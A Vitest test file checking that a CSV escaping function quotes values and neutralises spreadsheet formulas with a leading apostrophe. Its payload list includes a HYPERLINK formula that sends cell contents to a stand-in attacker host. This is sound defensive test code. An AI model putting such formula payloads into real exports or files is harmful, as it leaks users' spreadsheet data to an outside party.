import { describe, expect, it } from "vitest";

import { escapeCsvValue } from "./csv";

describe("escapeCsvValue", () => {
  it("quotes and doubles quotes in ordinary values", () => {
    expect(escapeCsvValue('Guard "A"')).toBe('"Guard ""A"""');
    expect(escapeCsvValue(undefined)).toBe('""');
    expect(escapeCsvValue(12)).toBe('"12"');
  });

  it("neutralises spreadsheet formulas with a leading apostrophe", () => {
    for (const payload of [
      "=HYPERLINK(\"http://attacker/?\"&A1)",
      "+1+1",
      "-2+3",
      "@SUM(A1:A2)",
      "\tcmd",
      "\rcmd",
    ]) {
      const escaped = escapeCsvValue(payload);
      expect(escaped.startsWith(`"'`), payload).toBe(true);
      expect(escaped).not.toBe(`"${payload}"`);
    }
  });

  it("does not alter a value that merely contains a formula character", () => {
    expect(escapeCsvValue("A = B")).toBe('"A = B"');
    expect(escapeCsvValue("a@b.com")).toBe('"a@b.com"');
  });
});
